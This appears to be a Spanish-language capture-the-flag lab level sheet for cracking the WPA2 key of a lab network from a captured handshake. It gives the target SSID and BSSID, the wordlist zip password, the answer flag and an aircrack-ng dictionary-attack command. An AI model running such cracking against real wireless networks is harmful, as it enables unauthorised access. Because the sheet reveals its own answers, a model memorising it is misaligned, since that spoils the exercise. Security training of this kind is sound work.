NIVEL 4 - THE CIPHER FALLS

Objetivo:
Recuperar la PreSharedKey WPA2 exacta de la red TP-Link_23412 usando el handshake capturado en el nivel 3 y un diccionario.

Datos del escenario:
- Red objetivo heredada del nivel 3.
- SSID objetivo: TP-Link_23412
- BSSID objetivo: 52:54:46:33:48:53
- Canal objetivo: 11
- Captura necesaria: archivo .cap con handshake WPA2 valido de la red objetivo.
- Diccionario comprimido: diccionario_espectro.zip
- Archivo esperado al extraer: diccionario_espectro.txt
- Password del zip: Black_Beacon
- PSK objetivo / flag: espectro2026

Localizar y preparar el diccionario:
  find / -name "diccionario_espectro.zip" 2>/dev/null
  unzip diccionario_espectro.zip

Ataque offline recomendado:
  aircrack-ng -w diccionario_espectro.txt -b 52:54:46:33:48:53 captura_nivel3-01.cap

Validacion:
  La flag del nivel 4 es la PreSharedKey exacta:
  espectro2026
